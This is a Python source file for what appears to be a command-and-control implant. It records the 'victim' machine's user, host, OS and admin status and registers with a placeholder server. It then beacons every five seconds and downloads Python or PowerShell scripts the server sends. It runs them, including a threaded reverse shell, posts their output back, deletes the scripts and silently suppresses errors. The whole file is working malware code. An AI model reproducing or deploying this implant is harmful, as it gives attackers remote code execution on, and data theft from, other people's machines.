import os
import requests
import time
import random
import string
import base64
import platform
import pdb
import json
import subprocess
import sys
import traceback
from mss import mss
from os.path import isfile, join
import ctypes
import psutil
import socket
import hashlib

server_url = "##SERVER_URL##"

def staging(identifier):
	url = f"http://{server_url}/stage_0"
	platform_name = platform.system()

	## Check if ran as admin or not
	if platform_name == 'Windows':
		admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
	elif platform_name == 'Linux':
		admin = os.getuid() == 0

	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
	os_info = {'platform': platform_name, 'version': platform.release(), 'admin':admin,'location' : os.path.dirname(os.path.realpath(__file__))}
	r = requests.post(url = url,cookies = cookies, data = os_info)
	return r

## Send out beacons for 60secs at 5secs interval
def beacon(identifier):
	start_time = time.time()
	url = f"http://{server_url}"

	while True:

		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
		r = requests.get(url=url,cookies = cookies)

		## TODO - check the return codes too ?
		## Server has commanded the victim to die
		if r.text == 'Die':
			exit()
		elif r.text != 'Nothing Fishy going on here :)':
			## Didin't get default reply, so some command has been sent?
			handle_commands(r,identifier)

		time.sleep(5)

## Handles commands sent by server as reponse
def handle_commands(response, identifier):
	try:
		## Recieved the commands in a dictionary text {'cmd': 'screenshot', 'script': 'script text'}. Converting to dictionary
		res = json.loads(response.text)

		language = res['language']

		## Save the script to file
		if platform.system() == 'Linux':
			dump_dir = '/tmp'
		else:
			dump_dir = os.getcwd()

		## Script save to file as per language, and filename is saved with taskid
		## so that it doesn't conflict with same filename stored in memory
		filename = res['command']+f"_{res['task_id']}"
		if language == 'python':
			save_path = join(dump_dir,f"{filename}.py")
		else:
			## Powershell
			save_path = join(dump_dir,f"{filename}.ps1")

		f = open(save_path, "w+")
		f.write(res['script'])
		f.close()
		## Execute the script file
		if os.path.isfile(save_path):

			if language == 'python':
				## The dump directory is to be added to os path as python looks there for requires in case not in current directory
				sys.path.append(os.path.abspath(dump_dir))
				file =  __import__(filename)
				## For reverse shell if we don't use threads it will block the script
				if res['command'] == 'reverseshell':
					import threading
					t1 = threading.Thread(target=file.execute_command)
					t1.start()
					command_output = 'Started Reverse shell'
				else:
					command_output = file.execute_command()
			else:
				result = subprocess.run([r"powershell.exe", save_path], stdin=subprocess.PIPE , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
				command_output = result.stdout.decode('utf-8')


		## TODO - Add command successful or not?
		## Send the command output back to server
		if command_output:
			url = f"http://{server_url}/{res['command']}/output/{res['task_id']}"
			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}

			r = requests.post(url = url,cookies = cookies, data = command_output)
		else:
			## Some error happened while exexuting task, send some othe response code? TODO
			pass

		## Clean up the script we just created on the victim after execution
		if os.path.isfile(save_path):
			os.remove(save_path)
	except:
		## Some error happened while handling commands, sent the traceback to server back
		url = f"http://{server_url}/clienterror"
		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())

def main():

	## Will identify the victim
	platform_name = platform.system()
	if platform_name == 'Windows':
		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{platform.system()}@{platform.release()}@{ctypes.windll.shell32.IsUserAnAdmin()}").encode())
	elif platform_name == 'Linux':
		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{platform.system()}@{platform.release()}@{os.getuid()}").encode())
	identifier = hash.hexdigest()[0:10]
	response = staging(identifier)
	
	if response.status_code == 200:
		beacon(identifier)
	elif response.text == 'Victim already registered' and response.status_code == 302:
		## Victim already registered
		beacon(identifier)

if __name__=="__main__":
	try:
		main()
	except:
		## So that the stager process doesn't complain in case of any error
		pass